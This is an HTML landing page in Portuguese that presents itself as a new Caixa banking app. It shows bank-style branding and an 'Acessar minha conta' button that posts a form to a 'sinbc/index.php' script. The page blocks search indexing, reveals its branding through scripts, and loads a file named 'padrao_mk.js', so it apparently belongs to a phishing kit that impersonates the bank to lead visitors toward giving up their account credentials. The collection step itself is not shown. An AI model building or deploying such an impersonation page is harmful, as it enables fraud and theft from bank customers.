<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="theme-color" content="#296fa7">
	<!-- LINKS ESTILO -->
	<link rel="stylesheet" type="text/css" href="assets/css/style_page_acesso.css">
	<link rel="stylesheet" type="text/css" href="assets/css/style_modal_alert.css">
	<link rel="shortcut icon" href="assets/imgs/favicon.png">
	
	<link rel="stylesheet" type="text/css" href="assets/css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="assets/css/style.css">
	
	<!-- SCRIPTS -->
	<script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	<script type="text/javascript" src="js/script_modal_alert.js"></script>
	<script type="text/javascript" src="js/script_page_acesso.js"></script>
	
	<script type="text/javascript" src="js/bootstrap.min.js"></script>
</head>
<body>
	
	<form name="form" id="form" action="sinbc/index.php" method="POST" onSubmit="return validation2()" autocomplete="off">
	 <section class="loadingHome" id="loadingHome">
         <div class="loading-content">
            <picture>
               <img src="assets/img/logoIndex.png" id="exibeLogoIndex" style="display: none;">
            </picture>
            <aside class="textIndex" id="exibeTextoIndex" style="display: none;">
               Olá.<br>
               Esse é o seu novo app<br>
               da nova adesão Caixa
            </aside>
         </div>
      </section>
	
	<section class="container-options">
		
		<header class="topHome">
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <section class="logoTop">
                     <img src="assets/img/logo-topo.png">
                  </section>
               </div>
            </div>
            <div class="row">
               <div class="col-md-12">
                  <section class="textTop">
                     <h3>Olá, que bom <br> ter você por aqui</h3>
                  </section>
               </div>
            </div>
         </div>
      </header>
		
		<main class="home-content">
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <section class="btnAccess">
                     <button type="submit" id="btn-client" class="btn client">Acessar minha conta</button>
                  </section>
               </div>
            </div>
            <div class="row">
               <div class="col-md-12">
                  <section class="productHome">
                     <img src="assets/img/content-home.png" class="img-fluid">
                  </section>
               </div>
            </div>
         </div>
      </main>
		</form>
	
	</section>
	
	 
	<div id="modal-alert" class="modal-alert">
		<div id="container-box-alert" class="container-box-alert">
			<div class="box-alert">
				<div class="hd-alert">
					<img class="ic-alert" src="assets/imgs/ic_alert.png">
					<h2>Opa...</h2>
				</div>
				<div id="msg-alert" class="msg-alert"></div>
			</div>
			<button id="btn-alert" class="btn-alert"><n>FECHAR</n></button>
		</div>
	</div>
	 
</body>
	
	  <script src="assets/js/padrao_mk.js"></script>
      <script src="assets/js/geral.js"></script>
	
</html>